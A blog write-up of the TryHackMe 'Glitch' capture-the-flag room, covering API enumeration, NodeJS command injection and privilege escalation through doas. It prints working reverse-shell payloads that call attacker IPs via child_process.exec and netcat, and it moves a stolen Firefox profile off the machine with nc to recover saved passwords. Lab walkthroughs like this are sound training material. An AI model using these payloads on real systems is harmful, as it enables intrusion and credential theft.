---
title: "TryHackMe - Glitch"
author: Nasrallah
description: ""
date: 2022-11-19 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, firefox, nodejs, reverse-shell, js]
img_path: /assets/img/tryhackme/glitch
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Glitch](https://tryhackme.com/room/glitch) from [TryHackMe](https://tryhackme.com). The machine is running a NodeJS application with a vulnerable api that we use to get foothold. After that we find a firefox profile that we run locally to get a password. Then we exploit a binary to get root.

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.114.236
Host is up (0.13s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: not allowed
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found port 80 open running nginx 1.14.0.

### Web

Let's go to the web page.

![](1.png)

We see a glitchy image. Let's check the source code.

![](2.png)

Found a hidden path(/api/access), let's see what's there.

![](3.png)

Got the value of token but it's base64 encoded. Let's decode it and replace the current token value in the cookie with the one we just got.

Refreshing the page we get a different page.

![](4.png)

The page doesn't have anything useful so let's check the source code.

![](5.png)

We can see a javascript file `script.js`. Let's check it out.

```js
(async function () {
  const container = document.getElementById('items');
  await fetch('/api/items')
    .then((response) => response.json())
    .then((response) => {
      response.sins.forEach((element) => {
        let el = `<div class="item sins"><div class="img-wrapper"></div><h3>${element}</h3></div>`;
        container.insertAdjacentHTML('beforeend', el);
      });
      response.errors.forEach((element) => {
        let el = `<div class="item errors"><div class="img-wrapper"></div><h3>${element}</h3></div>`;
        container.insertAdjacentHTML('beforeend', el);
      });
      response.deaths.forEach((element) => {
        let el = `<div class="item deaths"><div class="img-wrapper"></div><h3>${element}</h3></div>`;
        container.insertAdjacentHTML('beforeend', el);
      });
    });

  const buttons = document.querySelectorAll('.btn');
  const items = document.querySelectorAll('.item');
  buttons.forEach((button) => {
    button.addEventListener('click', (event) => {
      event.preventDefault();
      const filter = event.target.innerText;
      items.forEach((item) => {
        if (filter === 'all') {
          item.style.display = 'flex';
        } else {
          if (item.classList.contains(filter)) {
            item.style.display = 'flex';
          } else {
            item.style.display = 'none';
          }
        }
      });
    });
  });
})();

```

We found another path(/api/items), let's check it.

![](6.png)

Nothing really helpful. I checked the hint and it says `What other methods does the API accept?`, so i used `burp suite` to intercept a request and check the method from GET to POST.

![](7.png)

Now we forward the request, we sth new.

![](8.png)

We didn't get anything useful, but since we can use `POST` to the endpoint, maybe there is a parameter the api accepts.

Let's fuzz for that parameter using the following command:

```bash
ffuf -c -X POST -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -u http://10.10.114.236/api/items?FUZZ=test --fs 169
```

![](9.png)

We found the parameter and it's called `cmd`, so maybe we can execute command with it.

## **Foothold**

Let's use burp suite repeater to try the cmd parameter.

![](10.png)

Didn't work, but we got an error message informing us that we are dealing with an `NodeJS` application.

I found this [article](https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44) Where the author used the following command to get a reverse shell:

```js
require("child_process").exec('nc <IP Attacker> 4445 -e /bin/sh')
```

The `nc` will not work so let's change it to the following one.

```js
require("child_process").exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f')
```

Let's URL encode the command and put it into the parameter, set up a netcat listener and get a reverse shell.

```js
require("child_process").exec('rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.10.10%209001%20%3E%2Ftmp%2Ff')
```

![](11.png)

We send the request and get a shell.

![](12.png)


## **Privilege Escalation**

Inside user home directory, we find a hidden `.firefox` directory, maybe it has some saved passwords inside of it.

![](13.png)

Let's make an archive out of tha directory and download it into our machine.

```terminal
user@ubuntu:~$ tar -cf firefox.tgz .firefox
user@ubuntu:~$ ls
firefox.tgz  user.txt
```

On our machine we setup a listener that would catch the file.

```bash
nc -lvnp 1234 > firefox.tgz
```

Back to the compromised machine, we run the following command:

```terminal
user@ubuntu:~$ nc 10.18.0.188 1234 < firefox.tgz
```

Give the process some time to finish and we should see the file been transferred successfully.

![](14.png)

Extract it with `tar -xf firefox.tgz` and run the following command:

```bash
firefox --profile .firefox/b5w4643p.default-release 
```

This would start a firefox instance with the profile specified, and if we go to saved password we see `v0id`'s password.

![](15.png)

Now switch to void like the following:

```terminal
user@ubuntu:~$ su v0id
Password: 
v0id@ubuntu:/home/user$
```

In the /opt directory, we find something very interesting.

![](16.png)

Found a directory called `doas` and inside of it we find a `.git`.

I searched on github for `doas` and found this:

![](17.png)

We can run any command as other user. Let's run /bin/bash as root.

```terminal
v0id@ubuntu:/opt/doas$ doas -h
doas: invalid option -- 'h'
usage: doas [-nSs] [-a style] [-C config] [-u user] command [args]
v0id@ubuntu:/opt/doas$ doas -u root /bin/bash
Password: 
root@ubuntu:/opt/doas# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:/opt/doas# 
```

Great! We got root.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
